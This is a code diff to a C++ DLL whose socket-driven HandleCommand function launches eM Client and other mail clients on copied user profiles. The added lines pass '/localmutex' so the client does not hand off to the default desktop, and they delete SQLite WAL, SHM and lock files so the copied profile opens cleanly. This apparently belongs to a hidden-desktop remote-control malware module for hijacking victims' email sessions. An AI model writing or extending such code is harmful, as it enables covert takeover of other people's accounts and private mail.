@@ -2382,7 +2382,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             args += L" -profile \"" + profilePath + L"\"";
                         }
                     } else if (isEmClient) {
-                        args = L"";
+                        // Use /localmutex to prevent single-instance lock/delegation to default desktop
+                        args = L" /localmutex";
                         if (copyProfile && !profilePath.empty()) {
                             args += L" /dblocation \"" + profilePath + L"\"";
                         }
@@ -2474,8 +2475,18 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
                             } else if (isEmClient) {
                                 // eM Client locks usually aren't standard Chromium lock files.
-                                // It could use some local lock database files or processes.
-                                // No standard SingletonLock/parent.lock but let's be safe.
+                                // But they use SQLite and might leave WAL/SHM locks or custom Lock files.
+                                // Clean SQLite write-ahead-logs to prevent startup/recovery crashes.
+                                try {
+                                    for (const auto& entry : fs::recursive_directory_iterator(profilePath)) {
+                                        if (entry.is_regular_file()) {
+                                            wstring ext = entry.path().extension().wstring();
+                                            if (ext == L".wal" || ext == L".shm" || ext == L".lock") {
+                                                fs::remove(entry.path());
+                                            }
+                                        }
+                                    }
+                                } catch (...) {}
                             } else {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
